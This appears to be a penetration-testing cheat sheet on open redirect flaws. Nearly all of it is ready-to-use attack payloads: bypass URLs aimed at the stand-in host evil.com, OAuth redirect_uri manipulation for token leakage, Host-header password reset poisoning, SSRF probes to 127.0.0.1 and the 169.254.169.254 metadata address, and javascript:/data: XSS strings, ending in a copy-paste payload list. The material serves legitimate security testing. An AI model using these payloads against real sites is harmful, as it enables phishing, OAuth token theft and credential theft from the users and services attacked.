# Open Redirect 

Open Redirect occurs when user-controlled input is used in a redirection without proper validation, allowing attackers to redirect users to arbitrary domains.

Often chained into:
- Phishing
- OAuth token theft
- Password reset poisoning
- SSRF
- CSP bypass


# 1. Common Redirect Parameters

Look for:

```
?url=
?next=
?redirect=
?redirect_uri=
?return=
?returnTo=
?continue=
?dest=
?destination=
?target=
?goto=
?view=
?out=
```

Example:

```
/login?next=/dashboard
/redirect?url=https://example.com
/oauth?redirect_uri=https://example.com
```


# 2. Basic Exploitation

```
https://target.com/redirect?url=https://evil.com
```

If the app blindly redirects → Vulnerable.


# 3. Absolute URL Bypass Payloads

If simple external URLs are blocked, try variations:

```
https://evil.com
http://evil.com
//evil.com
///evil.com
////evil.com
```

Example:

```
?url=//evil.com
```

Many filters only block `http://`.


# 4. Username @ Trick

Browsers interpret everything before `@` as credentials:

```
https://target.com@evil.com
```

If app checks `startsWith("target.com")`, this may bypass.

# 5. Path Confusion Tricks

```
https://target.com.evil.com
https://target.com%2eevil.com
https://target.com/.evil.com
```

# 6. Encoding Bypasses

## URL encoding

```
https:%2f%2fevil.com
%68%74%74%70%73%3a%2f%2fevil.com
```

## Double encoding

```
https:%252f%252fevil.com
```

# 7. Backslash Bypass (Windows/IIS)

```
https:\\evil.com
\\evil.com
```

Some parsers treat `\` as `/`.

# 8. Mixed Slash Confusion

```
https:/\evil.com
https:\//evil.com
```

# 9. Subdomain Bypass

If app allows only `target.com`:

```
https://target.com.evil.com
https://target.com@evil.com
```

# 10. Whitelist Bypass Tricks

If app checks:

```
if (url.contains("target.com"))
```

Try:

```
https://evil.com?target.com
https://evil.com/#target.com
```

---

# 11. Relative Path Abuse

If external URLs blocked, try:

```
/\evil.com
//evil.com
/\/evil.com
```


# 12. Protocol Abuse

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

Sometimes used for XSS chaining.


# 13. OAuth Redirect Abuse

Very high impact.

Look for:

```
/oauth?redirect_uri=
```

Try:

```
redirect_uri=https://evil.com
redirect_uri=//evil.com
redirect_uri=https://target.com@evil.com
```

If allowed → token leakage possible.

# 14. Password Reset Poisoning

If reset link uses Host header or redirect param:

```
Host: evil.com
```

Or:

```
/reset?next=https://evil.com
```

Check email link behavior.


# 15. SSRF Chaining

If backend fetches redirect URL server-side:

```
?url=http://127.0.0.1
?url=http://169.254.169.254
```

# 16. Detection Workflow (Burp)

1. Intercept request
2. Replace redirect param with:
   - https://evil.com
   - //evil.com
   - https://target.com@evil.com
3. Observe:
   - Location header
   - 302 response
   - Browser redirect

Example response:

```
HTTP/1.1 302 Found
Location: https://evil.com
```

# 17. Quick Copy Paste Payload List

```
https://evil.com
http://evil.com
//evil.com
///evil.com
////evil.com

https://target.com@evil.com
https://target.com.evil.com
https://target.com%2eevil.com

https:%2f%2fevil.com
https:%252f%252fevil.com

\\evil.com
https:\\evil.com
https:/\evil.com

/\/evil.com
//evil.com/%2e%2e

javascript:alert(1)
data:text/html,<script>alert(1)</script>
```
